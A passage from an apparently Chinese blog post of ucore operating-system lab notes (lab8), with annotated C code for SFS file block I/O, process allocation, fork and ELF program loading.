/ SFS_BLKSIZE;          <span class="comment">/* Rd/Wr起始块的编号 */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> nblks = endpos / SFS_BLKSIZE - blkno;  <span class="comment">/* Rd/Wr块的大小 */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* &lt;---- start ----&gt; */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((blkoff = offset % SFS_BLKSIZE) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/* 对齐偏移,如果偏移没有对齐第一个基础块,则多读取/写入第一个基础块的末尾数据 */</span></span><br><span class="line">        size = (nblks != <span class="number">0</span>) ? (SFS_BLKSIZE - blkoff) : (endpos - offset);</span><br><span class="line">        <span class="keyword">if</span> ((ret = sfs_bmap_load_nolock(sfs, <span class="built_in">sin</span>, blkno, &amp;ino)) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">/* 获取第一个基础块所对应的block的编号ino */</span></span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((ret = sfs_buf_op(sfs, buf, size, ino, blkoff)) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">/* 通过上一步取出的ino,读取/写入一部分第一个基础块的末尾数据 */</span></span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line">        alen += size;</span><br><span class="line">        <span class="keyword">if</span> (nblks == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line">        buf += size, blkno ++, nblks --;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    size = SFS_BLKSIZE;</span><br><span class="line">    <span class="keyword">while</span> (nblks != <span class="number">0</span>) &#123; <span class="comment">/* 循环读取/写入对齐好的数据 */</span></span><br><span class="line">        <span class="keyword">if</span> ((ret = sfs_bmap_load_nolock(sfs, <span class="built_in">sin</span>, blkno, &amp;ino)) != <span class="number">0</span>) &#123; </span><br><span class="line">            <span class="comment">/* 获取inode对应的基础块编号 */</span></span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((ret = sfs_block_op(sfs, buf, ino, <span class="number">1</span>)) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">/* 单次读取/写入一基础块的数据 */</span></span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line">        alen += size, buf += size, blkno ++, nblks --;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((size = endpos % SFS_BLKSIZE) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/* 如果末尾位置没有与最后一个基础块对齐,则多读取/写入一点末尾基础块的数据 */</span></span><br><span class="line">        <span class="keyword">if</span> ((ret = sfs_bmap_load_nolock(sfs, <span class="built_in">sin</span>, blkno, &amp;ino)) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((ret = sfs_buf_op(sfs, buf, size, ino, <span class="number">0</span>)) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line">        alen += size;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* &lt;---- end ----&gt; */</span></span><br><span class="line">    </span><br><span class="line">out:</span><br><span class="line">    *alenp = alen;</span><br><span class="line">    <span class="keyword">if</span> (offset + alen &gt; <span class="built_in">sin</span>-&gt;din-&gt;size) &#123;</span><br><span class="line">        <span class="built_in">sin</span>-&gt;din-&gt;size = offset + alen;</span><br><span class="line">        <span class="built_in">sin</span>-&gt;dirty = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="练习2-完成基于文件系统的执行程序机制的实现"><a href="#练习2-完成基于文件系统的执行程序机制的实现" class="headerlink" title="练习2-完成基于文件系统的执行程序机制的实现"></a>练习2-完成基于文件系统的执行程序机制的实现</h2><p>基于文件系统的执行程序机制，有几部分地方需要添加代码，分别是 <code>alloc_proc</code> 、 <code>do_fork</code> 、 <code>load_icode</code> 三个函数</p>
<ul>
<li>alloc_proc：分配一个 proc_struct，用于描述进程的信息（在之前实验已经实现过了）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct proc_struct *</span></span><br><span class="line"><span class="function"><span class="title">alloc_proc</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span> =</span> kmalloc(<span class="keyword">sizeof</span>(struct proc_struct));</span><br><span class="line">    <span class="keyword">if</span> (proc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        proc-&gt;state = PROC_UNINIT;</span><br><span class="line">        proc-&gt;pid = <span class="number">-1</span>;</span><br><span class="line">        proc-&gt;runs = <span class="number">0</span>;</span><br><span class="line">        proc-&gt;kstack = <span class="number">0</span>;</span><br><span class="line">        proc-&gt;need_resched = <span class="number">0</span>;</span><br><span class="line">        proc-&gt;parent = <span class="literal">NULL</span>;</span><br><span class="line">        proc-&gt;mm = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;(proc-&gt;context), <span class="number">0</span>, <span class="keyword">sizeof</span>(struct context));</span><br><span class="line">        proc-&gt;tf = <span class="literal">NULL</span>;</span><br><span class="line">        proc-&gt;cr3 = boot_cr3;</span><br><span class="line">        proc-&gt;flags = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">memset</span>(proc-&gt;name, <span class="number">0</span>, PROC_NAME_LEN);</span><br><span class="line">        proc-&gt;wait_state = <span class="number">0</span>;</span><br><span class="line">        proc-&gt;cptr = proc-&gt;optr = proc-&gt;yptr = <span class="literal">NULL</span>;</span><br><span class="line">        proc-&gt;rq = <span class="literal">NULL</span>;</span><br><span class="line">        list_init(&amp;(proc-&gt;run_link));</span><br><span class="line">        proc-&gt;time_slice = <span class="number">0</span>;</span><br><span class="line">        proc-&gt;lab6_run_pool.left = proc-&gt;lab6_run_pool.right = proc-&gt;lab6_run_pool.parent = <span class="literal">NULL</span>;</span><br><span class="line">        proc-&gt;lab6_stride = <span class="number">0</span>;</span><br><span class="line">        proc-&gt;lab6_priority = <span class="number">0</span>;</span><br><span class="line">        proc-&gt;filesp = <span class="literal">NULL</span>; <span class="comment">/* lab8新添:proc-&gt;filesp,用于描述进程的文件相关信息 */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> proc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>新增的条目为 <code>files_struct</code> 结构体：（用于在进程中管理多个 <code>file</code> 结构体）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">files_struct</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">pwd</span>;</span>      <span class="comment">// 当前工作目录的inode</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">fd_array</span>;</span>  <span class="comment">// 打开的文件数组(存放file结构体)</span></span><br><span class="line">    <span class="keyword">int</span> files_count;        <span class="comment">// 打开的文件数</span></span><br><span class="line">    <span class="keyword">semaphore_t</span> files_sem;  <span class="comment">// 对应的信号量</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>do_fork：创建当前内核线程的一个副本，它们的执行上下文、代码、数据都一样，但是存储位置不同，在这个过程中，需要给新内核线程分配资源，并且复制原进程的状态（在之前实验已经实现过了）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">do_fork</span><span class="params">(<span class="keyword">uint32_t</span> clone_flags, <span class="keyword">uintptr_t</span> <span class="built_in">stack</span>, struct trapframe *tf)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = -E_NO_FREE_PROC;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (nr_process &gt;= MAX_PROCESS) &#123;</span><br><span class="line">        <span class="keyword">goto</span> fork_out;</span><br><span class="line">    &#125;</span><br><span class="line">    ret = -E_NO_MEM;</span><br><span class="line">    <span class="keyword">if</span> ((proc = alloc_proc()) == <span class="literal">NULL</span>) &#123; <span class="comment">/* 分配一个物理页,作为proc_struct */</span></span><br><span class="line">        <span class="keyword">goto</span> fork_out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    proc-&gt;parent = current; <span class="comment">/* 设置父进程为当前进程 */</span></span><br><span class="line">    assert(current-&gt;wait_state == <span class="number">0</span>); <span class="comment">/* lab5新增:断言进程为等待态 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (setup_kstack(proc) != <span class="number">0</span>) &#123; <span class="comment">/* 分配内核栈 */</span></span><br><span class="line">        <span class="keyword">goto</span> bad_fork_cleanup_proc;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (copy_fs(clone_flags, proc) != <span class="number">0</span>) &#123; <span class="comment">/* lab8新添:将当前进程的fs复制到,fork出的进程中 */</span></span><br><span class="line">        <span class="keyword">goto</span> bad_fork_cleanup_kstack;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (copy_mm(clone_flags, proc) != <span class="number">0</span>) &#123; <span class="comment">/* 将所有虚拟页数据复制过去 */</span></span><br><span class="line">        <span class="keyword">goto</span> bad_fork_cleanup_fs;</span><br><span class="line">    &#125;</span><br><span class="line">    copy_thread(proc, <span class="built_in">stack</span>, tf); <span class="comment">/* 复制线程的状态,包括寄存器上下文等等 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">bool</span> intr_flag;</span><br><span class="line">    local_intr_save(intr_flag); <span class="comment">/* 阻塞中断 */</span></span><br><span class="line">    &#123;</span><br><span class="line">        proc-&gt;pid = get_pid(); <span class="comment">/* 为进程分配唯一的PID */</span></span><br><span class="line">        hash_proc(proc); <span class="comment">/* 将proc添加到进程哈希链表中 */</span></span><br><span class="line">        set_links(proc); <span class="comment">/* lab5改动:取消list_add,采用set_links */</span></span><br><span class="line">    &#125;</span><br><span class="line">    local_intr_restore(intr_flag); <span class="comment">/* 解除中断的阻塞 */</span></span><br><span class="line">    wakeup_proc(proc); <span class="comment">/* 设置新的子进程可执行(唤醒该进程) */</span></span><br><span class="line">    ret = proc-&gt;pid; <span class="comment">/* 设置返回值为pid */</span></span><br><span class="line">    </span><br><span class="line">fork_out:</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">bad_fork_cleanup_fs: <span class="comment">/* lab8新添:goto标志位 */</span></span><br><span class="line">    put_fs(proc);</span><br><span class="line">bad_fork_cleanup_kstack:</span><br><span class="line">    put_kstack(proc);</span><br><span class="line">bad_fork_cleanup_proc:</span><br><span class="line">    kfree(proc);</span><br><span class="line">    <span class="keyword">goto</span> fork_out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>load_icode：加载并解析一个处于内存中的ELF执行文件格式的应用程序（函数改动较大）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">load_icode</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">int</span> argc, <span class="keyword">char</span> **kargv)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// fd:对应的文件描述符</span></span><br><span class="line">    <span class="comment">// argc:传入load_icode函数的参数个数</span></span><br><span class="line">    <span class="comment">// kargv:传入的各个参数</span></span><br><span class="line">    assert(argc &gt;= <span class="number">0</span> &amp;&amp; argc &lt;= EXEC_MAX_ARG_NUM);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (current-&gt;mm != <span class="literal">NULL</span>) &#123; <span class="comment">/* 检查当前进程是否为NULL */</span></span><br><span class="line">        panic(<span class="string">&quot;load_icode: current-&gt;mm must be empty.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> ret = -E_NO_MEM;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span>;</span> <span class="comment">/* mm_struct结构体:用于描述虚拟内存区域(vma)的各种信息 */</span></span><br><span class="line">    <span class="keyword">if</span> ((mm = mm_create()) == <span class="literal">NULL</span>) &#123; <span class="comment">/* 创建一片虚拟内存 */</span></span><br><span class="line">        <span class="keyword">goto</span> bad_mm; <span class="comment">/* 创建失败,直接返回 */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (setup_pgdir(mm) != <span class="number">0</span>) &#123; <span class="comment">/* 新建一个页目录表,每个进程都需要一个页目录表 */</span></span><br><span class="line">        <span class="keyword">goto</span> bad_pgdir_cleanup_mm; <span class="comment">/* 创建失败,执行mm_destroy */</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">page</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">elfhdr</span> __<span class="title">elf</span>, *<span class="title">elf</span> =</span> &amp;__elf; <span class="comment">/* lab8改动:获取的二进制文件的基础信息 */</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ((ret = load_icode_read(fd, elf, <span class="keyword">sizeof</span>(struct elfhdr), <span class="number">0</span>)) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/* 获取的二进制文件的文件头 */</span></span><br><span class="line">        <span class="keyword">goto</span> bad_elf_cleanup_pgdir;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (elf-&gt;e_magic != ELF_MAGIC) &#123; <span class="comment">/* 检查该程序的魔数是否正确 */</span></span><br><span class="line">        ret = -E_INVAL_ELF;</span><br><span class="line">        <span class="keyword">goto</span> bad_elf_cleanup_pgdir;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* &lt;---- 遍历程序头表,并构建vma ----&gt; */</span></span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proghdr</span> __<span class="title">ph</span>, *<span class="title">ph</span> =</span> &amp;__ph;</span><br><span class="line">    <span class="keyword">uint32_t</span> vm_flags, perm, phnum;</span><br><span class="line">    <span class="keyword">for</span> (phnum = <span class="number">0</span>; phnum &lt; elf-&gt;e_phnum; phnum ++) &#123; <span class="comment">/* 遍历整个程序头表(ph就是各个段头表) */</span></span><br><span class="line">        <span class="keyword">off_t</span> phoff = elf-&gt;e_phoff + <span class="keyword">sizeof</span>(struct proghdr) * phnum;</span><br><span class="line">        <span class="keyword">if</span> ((ret = load_icode_read(fd, ph, <span class="keyword">sizeof</span>(struct proghdr), phoff)) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">goto</span> bad_cleanup_mmap;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ph-&gt;p_type != ELF_PT_LOAD) &#123;</span><br><span class="line">            <span class="comment">/* 遍历寻找到ELF_PT_LOAD为止,在ucore中,该段是TEXT/DATA */</span></span><br><span class="line">            <span class="keyword">continue</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ph-&gt;p_filesz &gt; ph-&gt;p_memsz) &#123;</span><br><span class="line">            <span class="comment">/* 文件中段的大小 &gt; 内存中段的大小 */</span></span><br><span class="line">            <span class="comment">/* 内存中p_memsz大于p_filesz的原因是,可加载段可能包含一个.bss部分,没有此部分则是等于状态,绝对不可能是小于状态 */</span></span><br><span class="line">            ret = -E_INVAL_ELF;</span><br><span class="line">            <span class="keyword">goto</span> bad_cleanup_mmap; <span class="comment">/* 调用exit_mmap */</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ph-&gt;p_filesz == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/* &lt;---- 根据标志位进行初始化,准备构建vma ----&gt; */</span></span><br><span class="line">        </span><br><span class="line">        vm_flags = <span class="number">0</span>, perm = PTE_U;</span><br><span class="line">        <span class="keyword">if</span> (ph-&gt;p_flags &amp; ELF_PF_X) vm_flags |= VM_EXEC;</span><br><span class="line">        <span class="keyword">if</span> (ph-&gt;p_flags &amp; ELF_PF_W) vm_flags |= VM_WRITE;</span><br><span class="line">        <span class="keyword">if</span> (ph-&gt;p_flags &amp; ELF_PF_R) vm_flags |= VM_READ;</span><br><span class="line">        <span class="keyword">if</span> (vm_flags &amp; VM_WRITE) perm |= PTE_W;</span><br><span class="line">        <span class="keyword">if</span> ((ret = mm_map(mm, ph-&gt;p_va, ph-&gt;p_memsz, vm_flags, <span class="literal">NULL</span>)) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">/* 调用mm_map,为目标段构建新的vma */</span></span><br><span class="line">            <span class="keyword">goto</span> bad_cleanup_mmap; <span class="comment">/* 调用exit_mmap */</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/* &lt;---- 建立并分配页目录表,复制TEXT/DATA段到进程的内存(建立映射) ----&gt; */</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">off_t</span> offset = ph-&gt;p_offset; <span class="comment">/* 获取TEXT/DATA的段地址 */</span></span><br><span class="line">        <span class="keyword">size_t</span> off, size;</span><br><span class="line">        <span class="keyword">uintptr_t</span> start = ph-&gt;p_va, end, la = ROUNDDOWN(start, PGSIZE);</span><br><span class="line">        <span class="comment">/* start:初始化为段起始地址(映射段的虚拟地址) */</span></span><br><span class="line">        <span class="comment">/* la(可变参数):start进行内存页对齐后(只舍不进)的地址 */</span></span><br><span class="line">        </span><br><span class="line">        ret = -E_NO_MEM;</span><br><span class="line">        end = ph-&gt;p_va + ph-&gt;p_filesz;</span><br><span class="line">        <span class="comment">/* end:初始化为段结束地址(映射段的虚拟地址+文件中段的大小) */</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> (start &lt; end) &#123; <span class="comment">/* 持续为pgdir分配页表,直到整个段都完成映射 */</span></span><br><span class="line">            <span class="keyword">if</span> ((page = pgdir_alloc_page(mm-&gt;pgdir, la, perm)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="comment">/* 分配一块物理页(作为页表),设置页表项(对应la),插入页表目录(pgdir) */</span></span><br><span class="line">                ret = -E_NO_MEM;</span><br><span class="line">                <span class="keyword">goto</span> bad_cleanup_mmap;</span><br><span class="line">            &#125;</span><br><span class="line">            off = start - la; <span class="comment">/* 更新偏移 */</span></span><br><span class="line">            <span class="comment">/* 第一次: off=&#x27;start为了页对齐而舍弃的数值&#x27;(正) */</span></span><br><span class="line">            <span class="comment">/* 后续: off=&#x27;0&#x27; */</span></span><br><span class="line">            size = PGSIZE - off; <span class="comment">/* 更新已分配的段大小(每次增加PGSIZE) */</span></span><br><span class="line">            la += PGSIZE; <span class="comment">/* 更新当前的物理地址(每次增加PGSIZE) */</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (end &lt; la) &#123;</span><br><span class="line">                size -= la - end; <span class="comment">/* 获取准确的段大小 */</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ((ret = load_icode_read(fd, page2kva(page) + off, size, offset)) != <span class="number">0</span>) &#123; </span><br><span class="line">                <span class="comment">/* 获取页目录表的虚拟地址,通过off计算出对应页目录表项,用memcpy在其中填入from(TEXT/DATA段的起始地址) */</span> </span><br><span class="line">                <span class="keyword">goto</span> bad_cleanup_mmap;</span><br><span class="line">            &#125;</span><br><span class="line">            start += size, offset += size;</span><br><span class="line">            <span class="comment">/* 第一次: start增加的值比la小一些 */</span></span><br><span class="line">            <span class="comment">/* 后续: start和la都增加相同的值(PGSIZE),并且地址也相同 */</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/* &lt;---- 分配内存,建立并分配页目录表,建立BSS段(建立映射) ----&gt; */</span></span><br><span class="line">        </span><br><span class="line">        end = ph-&gt;p_va + ph-&gt;p_memsz; <span class="comment">/* end:初始化为段结束地址(映射段的虚拟地址+内存中段的大小) */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (start &lt; la) &#123;</span><br><span class="line">            <span class="keyword">if</span> (start == end) &#123; <span class="comment">/* start最后会小于等于la,以下代码就是为了当&quot;start&lt;la&quot;时,实现&quot;start=la&quot;,并且置空原start距新start多出的部分 */</span></span><br><span class="line">                <span class="keyword">continue</span> ;</span><br><span class="line">            &#125;</span><br><span class="line">            off = start + PGSIZE - la, size = PGSIZE - off;</span><br><span class="line">            <span class="keyword">if</span> (end &lt; la) &#123;</span><br><span class="line">                size -= la - end;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">memset</span>(page2kva(page) + off, <span class="number">0</span>, size);</span><br><span class="line">            <span class="comment">/* 获取页目录表的虚拟地址,通过off计算出对应页目录表项,并使用memset置空 */</span></span><br><span class="line">            start += size;</span><br><span class="line">            assert((end &lt; la &amp;&amp; start == end) || (end &gt;= la &amp;&amp; start == la));</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> (start &lt; end) &#123; <span class="comment">/* 持续为pgdir分配页表,直到整个段都完成映射 */</span></span><br><span class="line">            <span class="keyword">if</span> ((page = pgdir_alloc_page(mm-&gt;pgdir, la, perm)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                ret = -E_NO_MEM;</span><br><span class="line">                <span class="keyword">goto</span> bad_cleanup_mmap; <span class="comment">/* 调用exit_mmap */</span></span><br><span class="line">            &#125;</span><br><span class="line">            off = start - la, size = PGSIZE - off, la += PGSIZE;</span><br><span class="line">            <span class="keyword">if</span> (end &lt; la) &#123;</span><br><span class="line">                size -= la - end;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">memset</span>(page2kva(page) + off, <span class="number">0</span>, size);</span><br><span class="line">            <span class="comment">/* 获取页目录表的虚拟地址,通过off计算出对应页目录表项,并使用memset置空 */</span></span><br><span class="line">            start += size;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* &lt;---- 构建用户堆栈内存 ----&gt; */</span></span><br><span class="line">    </span><br><span class="line">    sysfile_close(fd);</span><br><span class="line">    vm_flags = VM_READ | VM_WRITE | VM_STACK;</span><br><span class="line">    <span class="keyword">if</span> ((ret = mm_map(mm, USTACKTOP - USTACKSIZE, USTACKSIZE, vm_flags, <span class="literal">NULL</span>)) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">goto</span> bad_cleanup_mmap; <span class="comment">/* 调用exit_mmap */</span></span><br><span class="line">    &#125;</span><br><span class="line">    